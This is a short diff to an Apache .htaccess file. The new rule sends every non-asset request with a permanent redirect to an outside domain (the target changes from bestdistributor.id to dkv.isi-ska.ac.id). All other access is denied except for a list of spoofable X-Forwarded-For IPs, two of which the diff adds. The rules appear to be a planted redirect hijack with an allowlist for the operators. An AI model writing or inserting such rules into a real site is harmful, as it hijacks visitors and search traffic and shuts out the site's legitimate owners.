@@ -1,12 +1,14 @@
 RewriteCond %{REQUEST_URI} \.(css|js|html|jpe?g|png|gif|svg|webp|ico|woff2?|ttf|eot)$ [NC]
 RewriteRule ^ - [L]
 
-RewriteRule ^(.*)$ https://bestdistributor.id/ [R=301,L]
+RewriteRule ^(.*)$ https://dkv.isi-ska.ac.id/ [R=301,L]
 
 SetEnvIf X-Forwarded-For "^136.228.135.175$" allowed_ip
 SetEnvIf X-Forwarded-For "^178.128.48.57$" allowed_ip
 SetEnvIf X-Forwarded-For "^146.70.14.30$" allowed_ip
 SetEnvIf X-Forwarded-For "^206.189.146.129$" allowed_ip
+SetEnvIf X-Forwarded-For "^116.212.130.44$" allowed_ip
+SetEnvIf X-Forwarded-For "^103.77.106.41$" allowed_ip
 
 Order Deny,Allow
 Deny from all
